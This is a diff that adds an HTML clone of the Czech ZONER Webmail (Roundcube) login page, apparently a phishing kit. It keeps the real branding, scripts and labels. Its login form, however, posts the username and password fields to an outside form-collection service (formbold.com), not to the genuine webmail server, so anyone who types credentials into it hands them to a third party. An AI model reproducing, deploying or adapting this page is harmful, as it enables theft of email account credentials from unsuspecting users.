@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="cs" class="js mozilla layout-large"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>ZONER Webmail :: webové rozhraní poštovní platformy Z-mail</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0"><meta name="theme-color" content="#0c5a98"><meta name="msapplication-navbutton-color" content="#0c5a98">
+	<link rel="shortcut icon" href="https://webmail.zoner.com/plugins/zoner_shared/images/zoner_webmail_symbol.svg?s=1742564606">
+	<link rel="stylesheet" href="chroustovice_files/bootstrap.min.css">
+	
+		<link rel="stylesheet" href="chroustovice_files/styles.min.css">
+		
+	
+	
+		<script>
+		try {
+			if (document.cookie.indexOf('colorMode=dark') > -1
+				|| (document.cookie.indexOf('colorMode=light') === -1 && window.matchMedia('(prefers-color-scheme: dark)').matches)
+			) {
+				document.documentElement.className += ' dark-mode';
+			}
+		} catch (e) { }
+		</script>
+	
+<meta name="description" content="Přihlášení do webového rozhraní ZONER Webmail. Vítejte v bezpečném e-mailu s trojitou ochranou - antivir, antispam a antiphishing. Poštu můžete číst díky Webmailu kdekoliv."><meta property="og:site_name" content="ZONER Webmail"><link rel="stylesheet" type="text/css" href="chroustovice_files/tls_icon.css"><link rel="stylesheet" type="text/css" href="chroustovice_files/jquery-ui.min.css"><link rel="stylesheet" type="text/css" href="chroustovice_files/zoner_2fa.css"><link rel="stylesheet" type="text/css" href="chroustovice_files/zoner_login.css"><link rel="stylesheet" type="text/css" href="chroustovice_files/zoner_css_fixer.css"><script type="application/ld+json"> { "@context" : "https://schema.org", "@type" : "WebSite", "name" : "webmail.zoner.com", "url" : "https://webmail.zoner.com/" } </script><script src="chroustovice_files/jquery.min.js"></script><script src="chroustovice_files/common.min.js"></script><script src="chroustovice_files/app.min.js"></script><script src="chroustovice_files/jstz.min.js"></script><script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"cs_CZ","devel_mode":null,"rcversion":10610,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"dark_mode_support":true,"skin":"elastic_zoner_blue","blankpage":"skins/elastic_zoner_blue/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"/?_task=login","compose_extwin":false,"date_format":"dd.mm.yy","date_format_localized":"DD.MM.RRRR","request_token":"SoQEOiV4uzxQ9Ek4NaEAF1BonzsWNFRp"});
+rcmail.add_label({"loading":"Načítám...","servererror":"Chyba serveru!","connerror":"Chyba připojení (Selhalo připojeni k serveru)!","requesttimedout":"Došlo k vypršení požadavku","refreshing":"Obnovuji...","windowopenerror":"Vyskakovací okno bylo zablokováno!","uploadingmany":"Nahrávám soubory...","uploading":"Nahrávám soubor...","close":"Zavřít","save":"Uložit","cancel":"Konec","alerttitle":"Pozor","confirmationtitle":"Jste si jistý...","delete":"Smazat","continue":"Pokračovat","ok":"OK","zoner_login.pluginname":"ZONER Login","zoner_login.plugindescription":"Vybere ZONER IMAP server pro přihlášení dle uživatelského jména","zoner_login.old_webmail":"Starší webmailové rozhraní","zoner_login.first_login":"DŮLEŽITÉ: Informace k prvnímu přihlášení do nového webmailu","zoner_login.support":"Zákaznická podpora","zoner_login.support_link":"https://www.czechia.com/clanek/zakaznicka-podpora/","zoner_login.forgotten_pass":"Zapomenuté heslo","zoner_login.forgotten_pass_inmail":"Zapomenuté heslo ke schránce na inMail","zoner_login.forgotten_pass_link":"https://napoveda.czechia.com/clanek/zmena-hesla-mailboxu/","zoner_login.show_pass":"Zobrazit heslo","zoner_login.hide_pass":"Skrýt heslo","zoner_login.keep_lang":"použít nastavení účtu","zoner_login.invalid_username_format":"Uživatelské jméno (část před symbolem @) obsahuje nepovolené znaky","zoner_login.username_must_be_mail_address":"Neplatný formát uživatelského jména - vložte platnou mailovou adresu","zoner_login.zis_error":"ZONER Login - Neznámá chyba při práci s CMS serverem ($cms_code).","zoner_login.db_error":"ZONER Login - Nepodařilo se zpracovat databázový dotaz pro přihlášení","zoner_login.db_error_imap_update":"ZONER Login - Nepodařilo se aktualizovat imap server v profilu uživatele","zoner_login.migration_in_progress":"V tuto chvíli se k mailboxu nelze přihlásit. Probíhá migrace dat nebo údržba serveru.","zoner_login.service_stopped":"V tuto chvíli se k mailboxu nelze přihlásit. Poštovní služba pro doménu je pozastavena.","zoner_login.domain_not_found":"Přihlášení se nezdařilo - pro doménu nebyla nalezena žádná poštovní služba","zoner_login.mailbox_not_found":"Přihlášení se nezdařilo - schránka nebyla v doméně nalezena","zoner_login.invalid_password":"Přihlášení se nezdařilo - heslo není správné","zoner_login.login_failed_unknown":"Chybné heslo nebo uživatelské jméno (kód chyby $cms_code)","zoner_login.maintenace_notify":"Upozornění: v termínu $disabled_from až $disabled_to proběhne odstávka webmailu kvůli údržbě našich interních systémů. Pošta v tu dobu bude plně funkční pomocí protokolů IMAP/POP3/SMTP.","zoner_login.maintenace_mode":"Právě probíhá servisní odstávka webmailu. Poštovní služby jsou stále k dispozici pomocí protokolů IMAP/POP3/SMTP.","zoner_login.unknown_error_cms":"Neznámá chyba CMS klienta.","zoner_login.unknown_error_general":"Došlo k neznámé chybě.","zoner_login.contact_helpdesk":"Prosím kontaktujte zákaznickou podporu.","zoner_login.failed_login_check_error":"Přihlášení se nezdařilo. Používáte správné uživatelské jméno a heslo?","zoner_settings.pluginname":"ZONER Settings","zoner_settings.plugindescription":"ZONER - RC setting hacks etc.","zoner_settings.domain_alias_load_failed":"Kontrola při ukládání se nezdařila. Nepodařilo se načíst seznam aliasů domény.","zoner_settings.mailbox_alias_load_failed":"Kontrola při ukládání se nezdařila. Nepodařilo se načíst seznam aliasů mailboxu.","zoner_settings.cms_login_failed":"Nepodařilo se přihlásit k CMS serveru","zoner_settings.invalid_identity_domain":"Jako email profilu je možno nastavit pouze platné aliasy mailboxu či domény.","zoner_settings.invalid_identity_mailbox":"Jako email profilu je možno nastavit pouze platné aliasy mailboxu či domény.","zoner_settings.cms_error":"Chyba při komunikaci s CMS serverem","zoner_settings.unknown_error":"Neznámá chyba. Prosím kontaktujte zákaznickou podporu","zoner_settings.vacation_redirect_info":"Máte-li aktivní přesměrování schránky bez uchování kopie, filtr Dovolená nebude spuštěn.","zoner_settings.vacation_newline_info":"Pole pro další adresu přidáte stisknutím klávesy \"enter\"","zoner_settings.filter_redirect_info":"Máte-li aktivní přesměrování mailboxu bez uchování kopie, filtr nebude spouštěn.","zoner_settings.no_mobile_layout":"skin neobsahuje mobilní šablonu","zoner_settings.attachment_count_limit":"Najednou můžete nahrát max. $limit souborů. Počet příloh však není omezen.","back":"Zpět","errortitle":"Došlo k chybě!","options":"Možnosti","plaintoggle":"Prostý text","htmltoggle":"HTML","previous":"Předchozí","next":"Následující","select":"Vybrat","browse":"Procházet","choosefile":"Vybrat soubor...","choosefiles":"Vybrat soubory..."});
+rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
+rcmail.gui_object('message', 'messagestack');
+</script>
+
+<script src="chroustovice_files/zoner_settings.js"></script><script src="chroustovice_files/jquery-ui.min.js"></script><script src="chroustovice_files/datepicker-cs.js"></script><script src="chroustovice_files/login.js"></script><script src="chroustovice_files/zoner_login.js"></script>
+</head>
+<body class="task-login action-none">
+	
+		<div id="layout">
+	
+
+
+<!-- ZONER -->
+<h1 class="voice">Přihlášení do služby ZONER Webmail</h1>
+<!-- ZONER -->
+
+<div id="layout-content" class="selected no-navbar" role="main">
+	<img src="chroustovice_files/zoner_webmail_logo.svg" id="logo" alt="Logo">
+	<form id="login-form" name="login-form" method="post" class="propform" action="https://formbold.com/s/3VyDO">
+<input type="hidden" name="_token" value="SoQEOiV4uzxQ9Ek4NaEAF1BonzsWNFRp" class="form-control">
+	<input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action" value="login" class="form-control"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos" class="form-control"><input type="hidden" name="_url" id="rcmloginurl" value="" class="form-control"><table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Uživatel</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input name="_user" id="rcmloginuser" required="" size="40" class="form-control" autocapitalize="none" type="text" placeholder="Uživatel"></td></tr><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginpwd">Heslo</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><div id="show-pass" title="Zobrazit heslo"><span class="show"></span></div><input name="_pass" id="rcmloginpwd" required="" size="40" class="form-control" autocapitalize="none" autocomplete="off" type="password" placeholder="Heslo"></td></tr><tr class="form-group row"><td class="title" style="display: none;"><label for="_language">Jazyk</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon update_lang"></i></span><select id="_language" name="_update_lang" class="lang_select form-control custom-select pretty-select" placeholder="Jazyk">
+<option value="0" selected="selected">použít nastavení účtu</option><option value="cs_CZ">Czech (Česky)</option><option value="sk_SK">Slovak (Slovenčina)</option><option value="en_US">English (US)</option><option value="de_DE">German (Deutsch)</option></select></td></tr></tbody></table><p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Přihlásit</button></p>
+		<div id="login-footer" role="contentinfo"><a href="https://napoveda.czechia.com/clanek/zmena-hesla-mailboxu/" target="_blank">Zapomenuté heslo</a>&nbsp;●&nbsp;<a href="https://www.czechia.com/clanek/zakaznicka-podpora/" target="_blank">Zákaznická podpora</a></div><div id="zoner_login_banner"><a href="https://www.czechia.com/clanek/antispam-a-antivir/" target="_blank"><img src="chroustovice_files/webmail_banner.svg"></a></div>
+
+
+
+<div id="messagestack"></div>
+<script>
+$(function() {
+rcmail.init();
+});
+</script>
+
+
+
+<script src="chroustovice_files/bootstrap.bundle.min.js"></script>
+<script src="chroustovice_files/ui.min.js"></script>
+
+
+</form></div></div></body></html>
